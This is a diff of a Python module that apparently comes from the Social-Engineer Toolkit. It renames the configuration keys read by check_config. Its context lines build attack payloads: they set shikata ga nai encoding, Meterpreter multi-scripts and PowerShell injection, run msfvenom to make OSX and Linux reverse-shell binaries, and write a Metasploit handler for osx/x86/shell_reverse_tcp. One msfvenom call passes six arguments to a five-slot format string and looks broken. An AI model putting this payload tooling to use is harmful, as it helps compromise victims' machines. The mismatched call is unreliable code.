@@ -28,7 +28,7 @@ port2 = "8081"
 operating_system = check_os()
 
 # check stage encoding - shikata ga nai for payload delivery
-stage_encoding = check_config("STAGE_ENCODING=").lower()
+stage_encoding = check_config("STAGE_ENCODING").lower()
 if stage_encoding == "off":
     stage_encoding = "false"
 else:
@@ -40,14 +40,14 @@ configfile = open("/etc/setoolkit/set.config", "r").readlines()
 msf_path = meta_path()
 
 # check the config files for all of the flags needed for the file
-auto_migrate = check_config("AUTO_MIGRATE=")
-meterpreter_multi = check_config("METERPRETER_MULTI_SCRIPT=")
-linux_meterpreter_multi = check_config("LINUX_METERPRETER_MULTI_SCRIPT=")
-meterpreter_multi_command = check_config("METERPRETER_MULTI_COMMANDS=")
+auto_migrate = check_config("AUTO_MIGRATE")
+meterpreter_multi = check_config("METERPRETER_MULTI_SCRIPT")
+linux_meterpreter_multi = check_config("LINUX_METERPRETER_MULTI_SCRIPT")
+meterpreter_multi_command = check_config("METERPRETER_MULTI_COMMANDS")
 meterpreter_multi_command = meterpreter_multi_command.replace(";", "\n")
-linux_meterpreter_multi_command = check_config("LINUX_METERPRETER_MULTI_COMMANDS=")
+linux_meterpreter_multi_command = check_config("LINUX_METERPRETER_MULTI_COMMANDS")
 linux_meterpreter_multi_command = linux_meterpreter_multi_command.replace(";", "\n")
-unc_embed = check_config("UNC_EMBED=")
+unc_embed = check_config("UNC_EMBED")
 
 attack_vector = 0
 linosx = 0
@@ -556,7 +556,7 @@ try:
         filewrite.close()
         # import if on
         setshell_counter = 0
-        powershell = check_config("POWERSHELL_INJECTION=")
+        powershell = check_config("POWERSHELL_INJECTION")
         if powershell.lower() == "on" or powershell.lower() == "yes":
             if choice1 == "set/reverse_shell" or choice1 == "RATTE":
                 print_status("Please note that the SETSHELL and RATTE are not compatible with the powershell injection technique. Disabling the powershell attack.")
@@ -597,7 +597,7 @@ try:
                         if choice1 == "cmd/multi": data = data.replace('param name="8" value="YES"', 'param name="8" value="NO"')
                         if choice1 != "cmd/multi":
                             # check if we don't want to deploy binaries
-                            deploy_binaries = check_config("DEPLOY_BINARIES=")
+                            deploy_binaries = check_config("DEPLOY_BINARIES")
                             if deploy_binaries.lower() == "n" or deploy_binaries.lower() == "no":
                                 data = data.replace('param name="8" value="YES"', 'param name="8" value="NO"')
                             if deploy_binaries.lower() == "y" or deploy_binaries.lower() == "yes":
@@ -628,16 +628,16 @@ try:
         if attack_vector == "java" or multiattack_java == "on":
             if attack_vector != "set_payload":
                 # pull in the ports from config
-                port1 = check_config("OSX_REVERSE_PORT=")
+                port1 = check_config("OSX_REVERSE_PORT")
                 # if we are using the multiattack, there will be port
                 # conflicts, need to scoot it to 8082
                 if attack_vector == "multiattack":
                     port1 = "8082"
                 # deploy nix and linux binaries
-                if check_config("DEPLOY_OSX_LINUX_PAYLOADS=").lower() == "on":
+                if check_config("DEPLOY_OSX_LINUX_PAYLOADS").lower() == "on":
 
                     # if we are using a custom linux/osx payload
-                    if check_config("CUSTOM_LINUX_OSX_PAYLOAD=").lower() == "on":
+                    if check_config("CUSTOM_LINUX_OSX_PAYLOAD").lower() == "on":
                         osx_path = raw_input(
                             "Enter the path for the custom OSX payload (blank for nothing): ")
                         lin_path = raw_input(
@@ -676,9 +676,9 @@ try:
 
                     else:
 
-                        port2 = check_config("LINUX_REVERSE_PORT=")
-                        osxpayload = check_config("OSX_PAYLOAD_DELIVERY=")
-                        linuxpayload = check_config("LINUX_PAYLOAD_DELIVERY=")
+                        port2 = check_config("LINUX_REVERSE_PORT")
+                        osxpayload = check_config("OSX_PAYLOAD_DELIVERY")
+                        linuxpayload = check_config("LINUX_PAYLOAD_DELIVERY")
                         print_status("Generating OSX payloads through Metasploit...")
                         subprocess.Popen(r"msfvenom -p %s LHOST=%s LPORT=%s --format elf > %s/mac.bin;chmod 755 %s/mac.bin" % (meta_path(), osxpayload, choice2, port1, userconfigpath, userconfigpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                         print_status("Generating Linux payloads through Metasploit...")
@@ -744,7 +744,7 @@ try:
 
             # Define linux and OSX payloads
             if payloadgen == "regular":
-                if check_config("DEPLOY_OSX_LINUX_PAYLOADS=").lower() == "on":
+                if check_config("DEPLOY_OSX_LINUX_PAYLOADS").lower() == "on":
                     filewrite.write("use exploit/multi/handler\n")
                     filewrite.write(
                         "set PAYLOAD osx/x86/shell_reverse_tcp" + "\n")
